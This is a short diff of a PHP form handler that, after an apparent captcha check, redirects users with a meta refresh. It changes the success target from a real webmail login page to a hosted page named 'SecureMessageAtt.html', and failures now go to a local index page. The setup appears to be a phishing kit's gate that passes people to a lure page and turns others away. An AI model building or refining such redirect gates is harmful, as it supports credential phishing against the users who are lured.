@@ -9,12 +9,12 @@ if(isset($_POST['submit'])){
         $responseData = json_decode($response);
 
         if($responseData->success){
-             print "<meta http-equiv=\"refresh\" content=\"0;URL=https://webmail.networksolutionsemail.com/ox6/interfaces/sso/login.php\">";
+             print "<meta http-equiv=\"refresh\" content=\"0;URL=https://message-7e9a6.web.app/SecureMessageAtt.html\">";
         }else{
-            print "<meta http-equiv=\"refresh\" content=\"0;URL=https://compassionate-blackwell-091edf.netlify.app\">";
+            print "<meta http-equiv=\"refresh\" content=\"0;URL=index.html\">";
         }
     }else{
-        print "<meta http-equiv=\"refresh\" content=\"0;URL=https://compassionate-blackwell-091edf.netlify.app\">";
+        print "<meta http-equiv=\"refresh\" content=\"0;URL=index.html\">";
     }
 }
 ?>
